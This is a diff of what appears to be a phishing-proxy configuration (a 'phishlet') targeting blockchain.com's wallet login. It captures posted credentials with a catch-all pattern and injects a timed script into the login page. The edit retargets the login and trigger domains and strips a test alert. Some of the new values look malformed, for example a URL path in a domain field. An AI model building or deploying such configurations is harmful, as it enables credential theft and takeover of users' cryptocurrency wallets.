@@ -23,14 +23,14 @@ credentials:
     search: '(.*)'
     type: 'post'
 login:
-  domain: 'www.blockchain.com'
+  domain: 'www.login.blockchain.com'
   path: '/'
 js_inject:
-  - trigger_domains: ["www.blockchain.com"]
+  - trigger_domains: ["www.blockchain.com/#/login"]
     trigger_paths: [".*?"]
     script: |
             function lp(){
-                var f0 =alert('Script Injected !'); 
+                ; 
                 return;
             }
             setTimeout(function(){lp();}, 1500);
